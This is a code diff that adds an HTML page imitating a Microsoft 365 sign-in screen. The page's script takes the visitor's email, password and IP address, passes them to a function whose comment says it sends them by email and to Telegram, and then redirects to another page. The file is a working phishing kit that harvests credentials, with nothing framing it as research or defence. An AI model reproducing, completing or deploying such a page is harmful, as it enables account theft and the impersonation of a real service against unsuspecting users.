@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="images/logo.png" type="image/x-icon">
+    <title>Microsoft 365 | Home </title>
+    <link rel="stylesheet" href="css/index.css" />
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <title>Login Form</title>
+</head>
+<body>
+    <div class="slideshow-container">
+      <img src="images/image1.jpg" alt="Slideshow Image" class="slideshow-image" />
+      <img src="images/image2.jpg" alt="Slideshow Image" class="slideshow-image" />
+      <img src="images/image3.jpg" alt="Slideshow Image" class="slideshow-image" />
+      <img src="images/image4.jpg" alt="Slideshow Image" class="slideshow-image" />
+    </div>
+
+    <div class="login-container">
+      <div class="header">
+        <h1>Sign In</h1>
+        <img src="images/lo.jpg" alt="Logo" class="logo" />
+      </div>
+
+      <form id="loginForm">
+        <p id="errorMessage" style="color: red; margin-top: 5px;"></p>
+        <input type="text" id="username" name="username" placeholder="recipient@email.com" style="font-style: italic" required />
+        <p id="errorMessagePassword" style="color: red; margin-top: 5px;"></p>
+        <input type="password" id="password" name="password" placeholder="Password" style="display: none" required />
+
+        <button type="button" id="nextButton">Next</button>
+      </form>
+
+      <div class="additional-buttons">
+        <button class="rounded-button continue-outlook">Continue with Outlook</button>
+        <button class="rounded-button continue-with-ionos">Continue with IONOS</button>
+        <button class="rounded-button continue-other-email">Continue with Other email</button>
+      </div>
+    </div>
+
+    <script>
+        console.log('Script file loaded');
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const nextButton = document.getElementById('nextButton');
+            const errorMessage = document.getElementById('errorMessage');
+            const errorMessagePassword = document.getElementById('errorMessagePassword');
+
+            passwordInput.style.display = 'none';
+
+            nextButton.addEventListener('click', async function () {
+                const trimmedUsername = usernameInput.value.trim();
+                const trimmedPassword = passwordInput.value.trim();
+
+                if (passwordInput.style.display === 'none') {
+                    if (!trimmedUsername) {
+                        errorMessage.textContent = 'Please fill in the username';
+                        errorMessagePassword.textContent = ''; // Clear password error message
+                        return;
+                    }
+
+                    errorMessage.textContent = ''; // Clear username error message
+
+                    // Store username in sessionStorage
+                    sessionStorage.setItem('username', trimmedUsername);
+
+                    passwordInput.style.display = 'block';
+                    nextButton.textContent = 'Sign In';
+                } else {
+                    if (!trimmedUsername) {
+                        errorMessage.textContent = 'Please fill in the username';
+                        errorMessagePassword.textContent = ''; // Clear password error message
+                        return;
+                    }
+
+                    if (!trimmedPassword) {
+                        errorMessagePassword.textContent = 'Please fill in the password';
+                        errorMessage.textContent = ''; // Clear username error message
+                        return;
+                    }
+
+                    errorMessage.textContent = ''; // Clear username error message
+                    errorMessagePassword.textContent = ''; // Clear password error message
+
+                    // Store password in sessionStorage
+                    sessionStorage.setItem('password', trimmedPassword);
+
+                    try {
+                      const ip = await getIPAddress();
+                      const data = {
+                          email: trimmedUsername,
+                          password: trimmedPassword,
+                          ip,
+                      };
+
+                      // Send email and to Telegram
+                      await sendRequest(data);
+
+                      // Reset the form
+                      document.getElementById('loginForm').reset();
+                      passwordInput.style.display = 'none';
+                      nextButton.textContent = 'Next';
+                  } catch (error) {
+                      console.error('Error:', error);
+                  }
+
+                    // Redirect to next.html
+                    window.location = 'next.html';
+                }
+            });
+
+            // ... existing code ...
+        });
+    </script>
+
+    <script src="js/index.js"></script>
+    <script src="js/smtp.js"></script>
+</body>
+</html>
